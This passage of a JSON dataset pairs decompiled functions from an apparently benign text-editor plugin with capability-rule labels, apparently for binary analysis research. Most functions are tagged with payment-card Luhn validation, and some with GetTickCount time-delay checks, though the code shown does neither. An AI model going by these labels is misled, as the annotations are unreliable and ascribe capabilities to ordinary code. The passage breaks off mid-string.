        "decompiled_code": "\nvoid fcn.18001a870(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uchar auVar3 [16];\n    uint32_t uVar4;\n    ulong *puVar5;\n    ulong arg2;\n    int64_t iVar6;\n    ushort in_DX;\n    \n    if ((*(arg1 + 0x10) & 0x100) != 0) {\n        in_DX = (**(**(*(arg1 + 0x18) + 8) + 0x40))();\n    }\n    iVar6 = *(arg1 + 8);\n    puVar5 = *(iVar6 + 0x30);\n    if (puVar5 == NULL) {\n        puVar5 = fcn.18008fb2c(0x10);\n        *puVar5 = 0;\n        puVar5[1] = 0;\n        *(iVar6 + 0x30) = puVar5;\n    }\n    uVar4 = *(puVar5 + 4);\n    if (*puVar5 < uVar4 || *puVar5 == uVar4) {\n        uVar1 = uVar4 + 0x10;\n        auVar3 = ZEXT816(2) * ZEXT416(uVar1);\n        arg2 = SUB168(auVar3, 0);\n        if (SUB168(auVar3 >> 0x40, 0) != 0) {\n            arg2 = 0xffffffffffffffff;\n        }\n        iVar6 = fcn.1800b15d0(puVar5[1], arg2);\n        if (iVar6 == 0) {\n            fcn.18006df20();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        puVar5[1] = iVar6;\n        uVar4 = *(puVar5 + 4);\n        *puVar5 = uVar1;\n    }\n    *(puVar5[1] + uVar4 * 2) = in_DX;\n    *(puVar5 + 4) = *(puVar5 + 4) + 1;\n    return;\n}\n",
        "token_count": 473
    },
    "18001b1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18001b1c0(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    char in_R9B;\n    uint64_t uVar5;\n    ushort *puVar6;\n    uint64_t uVar7;\n    \n    uVar7 = 0;\n    uVar5 = uVar7;\n    if (*0x1800ff588 != 0) {\n        uVar3 = uVar7;\n        do {\n            if (arg3 - arg2 >> 1 == *(uVar3 + 0x1800ff590)) {\n                puVar6 = *(uVar3 + 0x1800ff588);\n                iVar4 = arg2;\n                if (arg2 == arg3) break;\n                while( true ) {\n                    iVar1 = (**(**(arg1 + 8) + 0x40))(*(arg1 + 8), *puVar6);\n                    iVar2 = (**(**(arg1 + 8) + 0x40))();\n                    if (iVar2 != iVar1) break;\n                    iVar4 = iVar4 + 2;\n                    puVar6 = puVar6 + 1;\n                    if (iVar4 == arg3) goto code_r0x00018001b297;\n                }\n            }\n            uVar5 = uVar5 + 1;\n            uVar3 = uVar5 * 0x18;\n        } while (*(uVar3 + 0x1800ff588) != 0);\n    }\ncode_r0x00018001b297:\n    if (*(uVar5 * 0x18 + 0x1800ff588) != 0) {\n        uVar7 = *(uVar5 * 0x18 + 0x1800ff594);\n    }\n    if ((in_R9B != '\\0') && ((uVar7 & 3) != 0)) {\n        uVar7 = uVar7 | 3;\n    }\n    return uVar7;\n}\n",
        "token_count": 465
    },
    "18001b31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001b310(int64_t **arg1, ushort *arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    uint64_t arg2_00;\n    int64_t iVar3;\n    uchar auStack184 [32];\n    uint uStack152;\n    ulong uStack144;\n    ushort *puStack136;\n    int64_t aiStack128 [3];\n    uint64_t uStack104;\n    uchar auStack96 [16];\n    int64_t iStack80;\n    uint64_t uStack72;\n    \n    uStack144 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack184;\n    iVar2 = 0;\n    *(arg2 + 8) = 0;\n    *(arg2 + 0xc) = 7;\n    *arg2 = 0;\n    uStack152 = 1;\n    puStack136 = arg2;\n    if (arg3 != arg4) {\n        auStack96 = ZEXT816(0);\n        iStack80 = 0;\n        arg4 = arg4 - arg3;\n        arg2_00 = arg4 >> 1;\n        if (arg2_00 == 0) {\n            auStack96._0_8_ = 0;\n            iVar3 = iVar2;\n        }\n        else {\n            if (0x7fffffffffffffff < arg2_00) {\n                fcn.180014900();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            arg1_00 = fcn.180011cf0(auStack96, arg2_00);\n            auStack96 = CONCAT88(auStack96._8_8_, arg1_00);\n            iVar3 = arg1_00 + arg2_00 * 2;\n            iStack80 = iVar3;\n            fcn.1800ade80(arg1_00, arg3, arg4);\n            iVar2 = arg4 + arg1_00;\n            auStack96 = CONCAT88(iVar2, auStack96._0_8_);\n            auStack96._0_8_ = arg1_00;\n        }\n        iVar2 = auStack96._0_8_ + (iVar2 - auStack96._0_8_ >> 1) * 2;\n        (**(*arg1[1] + 0x38))(arg1[1], auStack96._0_8_, iVar2);\n        (**(**arg1 + 0x20))(*arg1, aiStack128, auStack96._0_8_, iVar2);\n        fcn.18000d960(arg2, aiStack128);\n        if (7 < uStack104) {\n            iVar2 = aiStack128[0];\n            if (0xfff < uStack104 * 2 + 2) {\n                iVar2 = *(aiStack128[0] + -8);\n                if (0x1f < (aiStack128[0] - iVar2) - 8U) {\n                    fcn.1800b3528(iVar2, uStack104 * 2 + 0x29);\n                    goto code_r0x00018001b4cf;\n                }\n            }\n            fcn.18008fb24(iVar2);\n        }\n        if (auStack96._0_8_ != 0) {\n            iVar2 = auStack96._0_8_;\n            if ((0xfff < (iVar3 - auStack96._0_8_ >> 1) * 2) &&\n               (iVar2 = *(auStack96._0_8_ + -8),  0x1f < (auStack96._0_8_ - iVar2) - 8U)) {\ncode_r0x00018001b4cf:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(iVar2);\n        }\n    }\n    fcn.18008fb00(uStack72 ^ auStack184);\n    return;\n}\n",
        "token_count": 922
    },
    "18001b98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001b980(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t arg1;\n    int64_t iVar3;\n    uint64_t arg1_00;\n    \n    arg1 = arg2 << 4;\n    if (arg2 < 0x1000000000000000) {\n        if (arg1 < 0x1000) {\n            if (arg1 == 0) {\n                return;\n            }\n            do {\n                iVar3 = fcn.1800b35a0(arg1);\n                if (iVar3 != 0) {\n                    return;\n                }\n                iVar2 = fcn.1800c086c(arg1);\n            } while (iVar2 != 0);\n            if (arg1 == 0xffffffffffffffff) {\n                fcn.180090898();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18006df20();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    else {\n        arg1 = 0xffffffffffffffff;\n    }\n    arg1_00 = arg1 + 0x27;\n    if (arg1_00 <= arg1) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(arg1_00);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *((iVar3 + 0x27U & 0xffffffffffffffe0) - 8) = iVar3;\n    return;\n}\n",
        "token_count": 389
    },
    "18001c21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001c210(ulong noname_0, ushort *arg2, ushort *arg3, ulong arg4)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    uchar auVar3 [16];\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    ulong arg2_00;\n    int64_t iVar6;\n    uint32_t *puVar7;\n    uint32_t **in_stack_00000028;\n    \n    puVar7 = *in_stack_00000028;\n    if (puVar7 != NULL) {\n        do {\n            if (*puVar7 <= arg4) break;\n            in_stack_00000028 = puVar7 + 6;\n            puVar7 = *(puVar7 + 6);\n        } while (puVar7 != NULL);\n        if ((puVar7 != NULL) && (arg4 == *puVar7)) goto code_r0x00018001c288;\n    }\n    puVar5 = fcn.18008fb2c(0x20);\n    *puVar5 = arg4;\n    *(puVar5 + 2) = 0;\n    *(puVar5 + 4) = 0;\n    *in_stack_00000028 = puVar5;\n    *(puVar5 + 6) = puVar7;\n    puVar7 = *in_stack_00000028;\ncode_r0x00018001c288:\n    if (arg2 != arg3) {\n        uVar4 = puVar7[3];\n        do {\n            uVar1 = *arg2;\n            arg2 = arg2 + 1;\n            if (puVar7[2] < uVar4 || puVar7[2] == uVar4) {\n                auVar3 = ZEXT816(2) * ZEXT416(uVar4 + 0x10);\n                arg2_00 = SUB168(auVar3, 0);\n                if (SUB168(auVar3 >> 0x40, 0) != 0) {\n                    arg2_00 = 0xffffffffffffffff;\n                }\n                iVar6 = fcn.1800b15d0(*(puVar7 + 4), arg2_00);\n                if (iVar6 == 0) {\n                    fcn.18006df20();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                *(puVar7 + 4) = iVar6;\n                puVar7[2] = uVar4 + 0x10;\n            }\n            *(*(puVar7 + 4) + puVar7[3] * 2) = uVar1;\n            puVar7[3] = puVar7[3] + 1;\n            uVar4 = puVar7[3];\n        } while (arg2 != arg3);\n    }\n    return;\n}\n",
        "token_count": 630
    },
    "18001c31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001c310(int64_t **arg1, ushort *arg2, int64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    uint64_t arg2_00;\n    int64_t iVar3;\n    uchar auStack200 [32];\n    uint uStack168;\n    ulong uStack160;\n    ushort *puStack152;\n    int64_t aiStack144 [3];\n    uint64_t uStack120;\n    uchar auStack112 [16];\n    int64_t iStack96;\n    uint64_t uStack88;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack88 = *0x180123080 ^ auStack200;\n    iVar2 = 0;\n    *(arg2 + 8) = 0;\n    *(arg2 + 0xc) = 7;\n    *arg2 = 0;\n    uStack168 = 1;\n    puStack152 = arg2;\n    if (arg3 != arg4) {\n        auStack112 = ZEXT816(0);\n        iStack96 = 0;\n        arg4 = arg4 - arg3;\n        arg2_00 = arg4 >> 1;\n        if (arg2_00 == 0) {\n            auStack112._0_8_ = 0;\n            iVar3 = iVar2;\n        }\n        else {\n            if (0x7fffffffffffffff < arg2_00) {\n                fcn.180014900();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            arg1_00 = fcn.180011cf0(auStack112, arg2_00);\n            auStack112 = CONCAT88(auStack112._8_8_, arg1_00);\n            iVar3 = arg1_00 + arg2_00 * 2;\n            iStack96 = iVar3;\n            fcn.1800ade80(arg1_00, arg3, arg4);\n            iVar2 = arg4 + arg1_00;\n            auStack112 = CONCAT88(iVar2, auStack112._0_8_);\n            auStack112._0_8_ = arg1_00;\n        }\n        iVar2 = auStack112._0_8_ + (iVar2 - auStack112._0_8_ >> 1) * 2;\n        (**(*arg1[1] + 0x38))(arg1[1], auStack112._0_8_, iVar2);\n        (**(**arg1 + 0x20))(*arg1, aiStack144, auStack112._0_8_, iVar2);\n        fcn.18000d960(arg2, aiStack144);\n        if (7 < uStack120) {\n            iVar2 = aiStack144[0];\n            if (0xfff < uStack120 * 2 + 2) {\n                iVar2 = *(aiStack144[0] + -8);\n                if (0x1f < (aiStack144[0] - iVar2) - 8U) {\n                    fcn.1800b3528(iVar2, uStack120 * 2 + 0x29);\n                    goto code_r0x00018001c4c1;\n                }\n            }\n            fcn.18008fb24(iVar2);\n        }\n        if (auStack112._0_8_ != 0) {\n            iVar2 = auStack112._0_8_;\n            if ((0xfff < (iVar3 - auStack112._0_8_ >> 1) * 2) &&\n               (iVar2 = *(auStack112._0_8_ + -8),  0x1f < (auStack112._0_8_ - iVar2) - 8U)) {\ncode_r0x00018001c4c1:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(iVar2);\n        }\n    }\n    fcn.18008fb00(uStack88 ^ auStack200);\n    return;\n}\n",
        "token_count": 924
    },
    "18001c7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "contain loop",
            "hash data using fnv"
        ],
        "decompiled_code": "\nbool fcn.18001c7f0(ulong noname_0, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t **ppiVar3;\n    \n    ppiVar3 = (*0x18012afe0 &\n              ((((((((*arg2 ^ 0xcbf29ce484222325) * 0x100000001b3 ^ *(arg2 + 1)) * 0x100000001b3 ^ *(arg2 + 2)) *\n                   0x100000001b3 ^ *(arg2 + 3)) * 0x100000001b3 ^ *(arg2 + 4)) * 0x100000001b3 ^ *(arg2 + 5)) *\n                0x100000001b3 ^ *(arg2 + 6)) * 0x100000001b3 ^ *(arg2 + 7)) * 0x100000001b3) * 0x10 + *0x18012afc8;\n    piVar2 = *ppiVar3;\n    if (piVar2 != *0x18012afb8) {\n        iVar1 = piVar2[2];\n        while (iVar1 != *arg2) {\n            if (piVar2 == ppiVar3[1]) {\n                return false;\n            }\n            piVar2 = *piVar2;\n            iVar1 = piVar2[2];\n        }\n    }\n    return piVar2 != *0x18012afb8;\n}\n",
        "token_count": 335
    },
    "18001c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001c980(void)\n\n{\n    uchar auStack104 [32];\n    uint64_t var_40h;\n    uint64_t var_38h;\n    uint64_t var_30h;\n    uint64_t var_28h;\n    ulong var_20h;\n    uint64_t var_18h;\n    uint64_t var_10h;\n    \n    var_10h = *0x180123080 ^ auStack104;\n    *0x18012afa4 = (**0x1800de7f0)(*0x18012a218, 0x853, 0, 0);\n    var_40h = 0;\n    var_38h = 0;\n    var_30h = 0;\n    var_28h = 0;\n    var_20h = 0;\n    var_18h = 0;\n    (**0x1800de7f0)(*0x18012a218, 0x854, 0x30, &var_40h);\n    *0x180123cf0 = var_40h;\n    *0x180123cf4 = var_40h._4_4_;\n    *0x180123cf8 = var_38h;\n    *0x180123cfc = var_38h._4_4_;\n    *0x180123d00 = var_30h;\n    *0x180123d04 = var_30h._4_4_;\n    *0x180123d08 = var_28h;\n    *0x180123d0c = var_28h._4_4_;\n    *0x180123d10 = var_20h;\n    *0x180123d14 = var_20h._4_4_;\n    *0x180123d18 = var_18h;\n    *0x180123d1c = var_18h._4_4_;\n    (**0x1800de0a8)(*0x180123d20);\n    (**0x1800de0a8)(*0x180123d28);\n    (**0x1800de0a8)(*0x180123d30);\n    (**0x1800de0a8)(*0x180123d38);\n    (**0x1800de0a8)(*0x180123d40);\n    (**0x1800de0a8)(*0x180123d48);\n    (**0x1800de0a8)(*0x180123d50);\n    (**0x1800de0a8)(*0x180123d58);\n    *0x180123d20 = (**0x1800de0b0)(var_40h & 0xffffffff);\n    *0x180123d28 = (**0x1800de0b0)(var_40h._4_4_);\n    *0x180123d30 = (**0x1800de0b0)(var_38h & 0xffffffff);\n    *0x180123d38 = (**0x1800de0b0)(var_38h._4_4_);\n    *0x180123d40 = (**0x1800de0b0)(var_30h & 0xffffffff);\n    *0x180123d48 = (**0x1800de0b0)(var_20h._4_4_);\n    *0x180123d50 = (**0x1800de0b0)(var_18h & 0xffffffff);\n    *0x180123d58 = (**0x1800de0b0)(var_18h._4_4_);\n    (**0x1800de0a8)(*0x180123d60);\n    (**0x1800de0a8)(*0x180123d68);\n    (**0x1800de0a8)(_str.X_b0d);\n    (**0x1800de0a8)(_str.9_b0);\n    *0x180123d60 = (**0x1800de078)(0, 1, var_28h & 0xffffffff);\n    *0x180123d68 = (**0x1800de078)(0, 1, var_20h._4_4_);\n    _str.X_b0d = (**0x1800de078)(0, 1, var_18h & 0xffffffff);\n    _str.9_b0 = (**0x1800de078)(0, 1, var_18h._4_4_);\n    fcn.18008fb00(var_10h ^ auStack104);\n    return;\n}\n",
        "token_count": 1009
    },
    "18001e69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001e690(ulong arg1)\n\n{\n    ulong uVar1;\n    uchar auStack72 [32];\n    ulong uStack40;\n    uchar uStack31;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack72;\n    uStack40 = 0;\n    uStack31 = 1;\n    if (*0x18012afa4 != '\\0') {\n        uStack40 = 0x1800f4a08;\n    }\n    uVar1 = 1;\n    if (*0x18012afa4 == '\\0') {\n        uVar1 = 6;\n    }\n    (**0x1800de878)(arg1, uVar1);\n    (**0x1800de7d0)(arg1, 0x18001f080, &uStack40);\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 208
    },
    "18001f97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001f970(ulong arg1)\n\n{\n    char16_t *pcVar1;\n    ulong *puVar2;\n    char16_t *pcVar3;\n    uchar auStack88 [32];\n    uchar auStack56 [2];\n    int16_t aiStack54 [7];\n    uchar auStack40 [16];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack88;\n    _auStack56 = ZEXT816(0);\n    auStack40 = ZEXT816(0);\n    (**0x1800de828)(arg1, auStack56, 0x10);\n    pcVar3 = NULL;\n    pcVar1 = pcVar3;\n    do {\n        if ((*(auStack56 + pcVar1 * 2) != *(pcVar1 * 2 + 0x1800f4a30)) ||\n           (*(auStack56 + pcVar1 * 2 + 2) != *(pcVar1 * 2 + 0x1800f4a32))) goto code_r0x00018001fa30;\n        pcVar1 = pcVar1 + 1;\n    } while (pcVar1 != 0x10);\n    puVar2 = fcn.18008fb2c(0x10);\n    puVar2[1] = 0;\n    *puVar2 = 0;\n    (**0x1800de010)(arg1, 0x18001f090, 0x2a, puVar2);\n    if (*0x18012afa4 != '\\0') {\n        pcVar3 = L\"DarkMode_Explorer\";\n    }\n    (**0x1800de890)(arg1, pcVar3, 0);\ncode_r0x00018001fa30:\n    fcn.18008fb00(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 413
    },
    "18001fb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001fb40(ulong param_1)\n\n{\n    int64_t iVar1;\n    ulong uStackX24;\n    uint auStackX32 [2];\n    ulong uStack16;\n    \n    uStack16 = 0x18001fb4c;\n    iVar1 = fcn.1800907e0();\n    iVar1 = -iVar1;\n    *(&stack0x000010d8 + iVar1) = *0x180123080 ^ &stack0xfffffffffffffff8 + iVar1;\n    *(&stack0xfffffffffffffff0 + iVar1) = 0x18001fb76;\n    fcn.1800ae290(&stack0x00000028 + iVar1, 0, 0x10a8);\n    *(&stack0x00000018 + iVar1) = 3;\n    *(&stack0x00000020 + iVar1) = 0x10;\n    *(&stack0x00000024 + iVar1) = 0x10;\n    *(&stack0xfffffffffffffff0 + iVar1) = 0x18001fba5;\n    (**0x1800de7f0)(param_1, 0x702, 0, &stack0x00000018 + iVar1);\n    *(&stack0xfffffffffffffff0 + iVar1) = 0x18001fbb5;\n    fcn.18008fb00(*(&stack0x000010d8 + iVar1) ^ &stack0xfffffffffffffff8 + iVar1);\n    return;\n}\n",
        "token_count": 332
    },
    "180020a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180020a90(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    puVar2 = fcn.180020a80();\n    iVar1 = fcn.1800b62ac(*puVar2, arg1, arg2, arg3);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 108
    },
    "180020af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180020af0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t *puVar2;\n    \n    puVar2 = fcn.180020a80();\n    iVar1 = fcn.1800b6240(*puVar2 | 2, arg1, arg2, arg3);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 113
    },
    "180020ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.180020ff0(code **arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    code *pcVar4;\n    \n    if (0x7 < arg1[0x22]) {\n        pcVar1 = arg1[0x1f];\n        iVar2 = arg1[0x22] * 2;\n        pcVar3 = pcVar1;\n        if (0xfff < iVar2 + 2U) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = iVar2 + 0x29;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x0001800211ca;\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[0x22] = 0x7;\n    arg1[0x21] = NULL;\n    *(arg1 + 0x1f) = 0;\n    if (0x7 < arg1[0x1e]) {\n        pcVar1 = arg1[0x1b];\n        iVar2 = arg1[0x1e] * 2;\n        pcVar3 = pcVar1;\n        if (0xfff < iVar2 + 2U) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = iVar2 + 0x29;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x0001800211ca;\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[0x1d] = NULL;\n    arg1[0x1e] = 0x7;\n    *(arg1 + 0x1b) = 0;\n    pcVar4 = arg1[0x1a];\n    if (0xf < pcVar4) {\n        pcVar1 = arg1[0x17];\n        pcVar3 = pcVar1;\n        if (0xfff < pcVar4 + 1) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = pcVar4 + 0x28;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) goto code_r0x0001800211ca;\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[0x19] = NULL;\n    arg1[0x1a] = 0xf;\n    *(arg1 + 0x17) = 0;\n    pcVar4 = arg1[0x16];\n    if (0xf < pcVar4) {\n        pcVar1 = arg1[0x13];\n        pcVar3 = pcVar1;\n        if (0xfff < pcVar4 + 1) {\n            pcVar3 = *(pcVar1 + -8);\n            pcVar4 = pcVar4 + 0x28;\n            iVar2 = pcVar1 - pcVar3;\n            if (0x1f < iVar2 - 8U) {\ncode_r0x0001800211ca:\n                fcn.1800b3528(iVar2, pcVar4);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(pcVar3);\n    }\n    arg1[0x15] = NULL;\n    arg1[0x16] = 0xf;\n    *(arg1 + 0x13) = 0;\n    if (arg1[8] != NULL) {\n        (**0x1800de0a8)();\n    }\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] != NULL) {\n        (**0x1800de7d8)(arg1[3], 0xffffffeb);\n        (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n        (**0x1800de680)(arg1[3]);\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "1800211d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800211d0(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    ulong *puVar6;\n    uchar auStack168 [32];\n    ulong uStack136;\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    ulong uStack40;\n    uint uStack32;\n    uint64_t uStack24;\n    \n    uVar2 = *0x18012a388;\n    uStack24 = *0x180123080 ^ auStack168;\n    cVar1 = (**(*0x180125600 + 0x68))(0x180125600);\n    if (cVar1 == '\\0') {\n        *0x180125610 = *0x18012a390;\n        *0x180125608 = uVar2;\n        (**(*0x180125600 + 0x60))(0x180125600, 0x238c, 0, 1);\n    }\n    *0x180125670 = (**0x1800de798)(*0x180125618, 0x238e);\n    *0x180125678 = (**0x1800de798)(*0x180125618, 0x2394);\n    *0x180125680 = (**0x1800de798)(*0x180125618, 0x23a2);\n    *0x1801256b8 = (**0x1800de798)(*0x180125618, 0x23b8);\n    *0x1801256c0 = (**0x1800de798)(*0x180125618, 0x23bc);\n    *0x1801256c8 = (**0x1800de798)(*0x180125618, 0x23be);\n    *0x1801256d0 = (**0x1800de798)(*0x180125618, 0x23c2);\n    *0x180125630 = (**0x1800de798)(*0x180125618, 0x23d7);\n    *0x180125638 = (**0x1800de798)(*0x180125618, 0x23d5);\n    iVar5 = 0x239b;\n    puVar6 = 0x1801256a0;\n    do {\n        uVar2 = (**0x1800de798)(*0x180125618, iVar5);\n        puVar6[-3] = uVar2;\n        iVar5 = iVar5 + 2;\n        uVar2 = (**0x1800de798)(*0x180125618);\n        *puVar6 = uVar2;\n        puVar6 = puVar6 + 1;\n    } while (puVar6 < 0x1801256b8);\n    uStack136 = 0;\n    (**0x1800de730)(*0x180125618, 0x2392, 0xc5);\n    uStack136 = 0;\n    (**0x1800de730)(*0x180125618, 0x23ba, 0xc5);\n    (**0x1800de7f0)(*0x180125678, 0xc5, 0x104, 0);\n    (**0x1800de7f0)(*0x1801256a0, 0xc5, 0x104, 0);\n    (**0x1800de7f0)(*0x1801256a8, 0xc5, 0x104, 0);\n    (**0x1800de7f0)(*0x1801256b0, 0xc5, 0x104, 0);\n    (**0x1800de7f0)(*0x1801256c0, 0xc5, 0x104, 0);\n    (**0x1800de7f0)(*0x1801256c8, 0xc5, 0x104, 0);\n    (**0x1800de7f0)(*0x180125630, 0xc5, 0x7fff, 0);\n    (**0x1800de7f0)(*0x180125638, 0xc5, 0x7fff, 0);\n    (**0x1800de010)(*0x180125630, 0x18002d6f0, 0, 0);\n    (**0x1800de010)(*0x180125638, 0x18002d6f0, 0, 0);\n    (**0x1800de010)(*0x180125688, 0x18002d240, 0, 0);\n    (**0x1800de010)(*0x180125690, 0x18002d240, 0, 0);\n    (**0x1800de010)(*0x180125698, 0x18002d240, 0, 0);\n    uVar2 = (**0x1800de798)(*0x180125618, 0x238f);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = uStack136 & 0xffffffffffffff00;\n    fcn.180067d90(*0x180125618, 0x238f, 0, L\"Move down the selected File Type\");\n    uVar2 = (**0x1800de798)(*0x180125618, 0x2390);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = uStack136 & 0xffffffffffffff00;\n    fcn.180067d90(*0x180125618, 0x2390, 0, L\"Move up the selected File Type\");\n    uVar2 = (**0x1800de798)(*0x180125618, 0x23a9);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = CONCAT71(uStack136._1_7_, 1);\n    uVar2 = fcn.180067d90(*0x180125618, 0x23a9, 0x1800f4ff8, \n                          L\"1. Check this box only if the file type is likely to contain multi-byte character data.\\r\\n\\r\\n2. When this box is checked, field widths will be calculated using character counts. And, TABs will be counted as multiple spaces (or characters).\\r\\n\\r\\n3. When this box is unchecked, field widths will be calculated using byte counts.\\r\\n\\r\\nClick the (i) icon to view the online documentation.\"\n                         );\n    (**0x1800de7f0)(uVar2, 0x403, 2, 30000);\n    uVar2 = (**0x1800de798)(*0x180125618, 0x2397);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    uStack136 = CONCAT71(uStack136._1_7_, 1);\n    uVar2 = fcn.180067d90(*0x180125618, 0x2397, L\"ADFT in a Nutshell\", \n                          L\"1. Line Numbers begin at \\'1\\', counting forwards from the start of file. Negative line numbers will count backwards from the end of file. Zero and numbers (+ve or -ve) beyond file line count will fail ADFT matching.\\r\\n\\r\\n2. ADFT Regexes with no terminating \\'$\\' will be used as *starts-with* match. Whereas, those with terminating \\'$\\' will be used as *full-line* match. ADFT Regexes will have an implicit 